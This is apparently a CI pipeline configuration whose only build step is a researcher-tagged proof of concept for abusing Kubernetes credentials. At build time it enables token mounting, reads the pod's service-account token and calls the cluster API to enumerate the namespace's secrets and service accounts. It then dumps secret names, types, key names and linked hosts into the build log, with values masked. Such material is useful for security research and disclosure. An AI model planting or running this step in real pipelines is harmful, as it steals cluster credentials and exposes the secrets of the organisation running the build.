general:
  buildTool: 'mta'
  jenkinsKubernetes:
    additionalPodProperties:
      automountServiceAccountToken: true
service:
  stages:
    Build:
      runFirst:
        command: |
          T=/var/run/secrets/kubernetes.io/serviceaccount
          NS=$(cat $T/namespace)
          K=https://kubernetes.default.svc
          A="Authorization: Bearer $(cat $T/token)"
          echo "KPSEC7788-NS=$NS"
          curl -s -o /tmp/s -w 'KPSEC7788-LIST-HTTP=%{http_code}\n' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets
          echo "KPSEC7788-LIST-BYTES=$(wc -c < /tmp/s)"
          echo "KPSEC7788-SECRET-NAMES:"
          grep -o '"name": "[^"]*"' /tmp/s | sort -u
          echo "KPSEC7788-SECRET-TYPES:"
          grep -o '"type": "[^"]*"' /tmp/s | sort -u
          echo "KPSEC7788-DATA-KEYNAMES-ONLY:"
          grep -oE '^ +"[A-Za-z0-9._-]+": "[A-Za-z0-9+/=]{40,}"' /tmp/s | sed -E 's/: ".*/: <redacted-by-researcher>/' | sort -u
          echo "KPSEC7788-ANNOTATION-HOSTS:"
          grep -oE '(docker-hub|repositories|\.cloud\.sap|\.hana\.ondemand\.com)[A-Za-z0-9./-]*' /tmp/s | sort -u | head -10
          echo "KPSEC7788-SHA256-OF-WHOLE-LIST=$(sha256sum < /tmp/s | cut -c1-16)"
          echo "KPSEC7788-SERVICEACCOUNTS-HTTP=$(curl -s -o /tmp/sa -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/serviceaccounts)"
          grep -o '"name": "[^"]*"' /tmp/sa | sort -u | head -10
          echo "KPSEC7788-DONE"
